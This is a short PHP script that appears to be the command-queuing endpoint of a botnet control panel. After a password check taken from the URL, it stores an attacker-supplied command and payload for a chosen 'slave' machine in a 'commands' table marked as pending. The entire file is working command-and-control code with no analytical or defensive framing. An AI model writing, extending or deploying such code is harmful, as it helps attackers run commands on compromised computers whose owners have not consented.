<?
include("../includes/configuration.inc.php");
include("../includes/mysql_connect.inc.php");
//-------------------------------------------
if(isset($_GET['client']))
{
$passwords = $_GET['password'];
if($passwords == $passwordc) 
{
$command = $_GET['cmd'];
$content = $_GET['content'];
$slave_id = $_GET['id'];
$command = mysql_escape_string($command);
$content = mysql_escape_string($content);
$slave_id = mysql_escape_string($slave_id);
//--------------------------------------
$update_query = "UPDATE slaves SET command='$command' WHERE id='$slave_id'";
mysql_query($update_query, $connect);
$add_command = "INSERT INTO  commands (slave_id, command, status, content)
VALUES ('$slave_id', '$command', 'pending', '$content')";
mysql_query($add_command, $connect);
}
}
?>